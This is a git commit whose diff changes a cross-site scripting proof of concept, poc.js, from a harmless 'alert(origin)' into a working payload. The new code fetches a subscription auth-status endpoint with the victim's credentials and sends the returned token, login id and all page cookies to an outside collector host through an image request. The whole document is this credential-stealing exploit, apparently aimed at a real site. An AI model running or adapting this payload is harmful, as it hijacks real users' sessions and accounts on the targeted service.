bf5370062c12ca290ed39db0d49ef2505a190b48
0xffffff <76949603+xorraxrax1@users.noreply.github.com>
2026-06-23 14:56:49 +0100

    Replace alert with fetch for auth status

--- poc.js
+++ poc.js
@@ -1,1 +1,6 @@
-alert(origin)
+fetch('/subscribe/user/auth-status', {credentials:'include'})
+  .then(r => r.json())
+  .then(j => new Image().src = '//q9fpgq7v.instances.httpworkbench.com/c?'
+     + 't=' + encodeURIComponent(j.ottoken)         
+     + '&id=' + encodeURIComponent(j.wapo_login_id)
+     + '&c=' + encodeURIComponent(document.cookie)); 
